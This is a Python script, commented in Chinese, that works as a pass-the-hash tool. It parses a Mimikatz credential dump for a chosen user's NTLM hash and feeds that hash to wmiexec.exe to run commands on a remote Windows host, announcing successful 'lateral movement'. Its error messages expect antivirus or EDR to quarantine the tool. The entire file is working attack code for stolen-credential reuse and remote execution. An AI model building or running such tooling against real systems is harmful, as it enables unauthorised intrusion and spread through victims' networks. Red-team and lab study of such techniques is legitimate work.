import re
import sys
import os
import subprocess

def parse_mimikatz_for_ntlm(target_user, log_file="mimikatz.txt"):
    if not os.path.exists(log_file):
        print(f"[-] Error: Log file '{log_file}' not found.")
        return None

    content = ""
    # 解決編碼問題：嘗試多種格式讀取
    for enc in ['utf-16', 'utf-16-le', 'utf-8', 'ascii']:
        try:
            with open(log_file, "r", encoding=enc, errors="ignore") as f:
                temp = f.read()
                if "Authentication Id" in temp:
                    content = temp
                    break
        except:
            continue

    if not content:
        return None

    #依照 "Authentication Id" 切割大區塊
    blocks = content.split("Authentication Id")
    
    for block in blocks:
        # 檢查此區塊是否包含目標 User Name (使用強匹配避免抓到 PC01$)
        # 我們搜尋 "User Name : Administrator" 這種格式
        user_pattern = rf"User Name\s*:\s+{re.escape(target_user)}\b"
        if re.search(user_pattern, block, re.IGNORECASE):
            
            # 如果帳號對了，就在「同一個區塊內」找 NTLM
            # 考慮到 Mimikatz 輸出格式，NTLM 前面可能會有 [00000003] 或 * 等符號
            # 匹配 NTLM : 後接 32 位元的 Hex
            hash_pattern = r"NTLM\s*:\s*([a-fA-F0-9]{32})"
            hash_match = re.search(hash_pattern, block, re.IGNORECASE)
            
            if hash_match:
                ntlm = hash_match.group(1)
                # 排除空密碼常見的 Hash (31d6cfe0d16ae931b73c59d7e0c089c0)
                if ntlm.lower() != "31d6cfe0d16ae931b73c59d7e0c089c0":
                    return ntlm

    return None

def main():
    if len(sys.argv) < 3:
        print("Usage: pth_tool.exe [Username] [Target_IP]")
        sys.exit(1)

    find_user = sys.argv[1]
    target_ip = sys.argv[2]
    log_name = "mimikatz.txt" 
    tool_name = "wmiexec.exe" # 之後若改 exe 這裡要手動改

    print(f"[*] Extracting NTLM hash for user '{find_user}'...")
    ntlm_hash = parse_mimikatz_for_ntlm(find_user, log_name)

    if ntlm_hash:
        print(f"[+] Found Verified Hash: {ntlm_hash}")

        # 檢查工具是否存在，英文錯誤訊息提示 AV 攔截
        if not os.path.exists(tool_name):
            print(f"Error: '{tool_name}' not found.")
            print(f"The tool might have been deleted or quarantined by Antivirus (AV/EDR).")
            sys.exit(1)

        # 執行指令
        attack_command = [tool_name, "-hashes", f":{ntlm_hash}", f"{find_user}@{target_ip}", "dir C:\\"]
        
        print(f"Targeting Remote Host: {target_ip}")
        print(f"Authenticating as: {find_user}")

        try:
            print("-" * 30 + " REMOTE OUTPUT " + "-" * 30)
            # 執行攻擊指令
            subprocess.run(attack_command, check=True)
            print("-" * 60)
            print(f"[+] SUCCESS: Lateral movement to {target_ip} completed.")

        except subprocess.CalledProcessError as e:
            print("-" * 60)
            print(f"FAILURE: Command returned an error code ({e.returncode}).")
            # --- 判斷失敗原因 ---
            if e.returncode == 1:
                print("    - Reason: Potential Access Denied (Invalid Hash or Insufficient Privileges).")
            elif e.returncode == 127:
                print("    - Reason: Tool path error or binary not executable.")
            else:
                print("    - Reason: Network timeout, RPC service disabled, or AV/EDR block.")
            print("-" * 60)

        except FileNotFoundError:
            print(f"FAILURE: '{tool_name}' disappeared during execution!")
            print("Reason: Highly likely deleted by Real-Time Protection (AV/EDR).")

        except Exception as e:
            print(f"FAILURE: An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()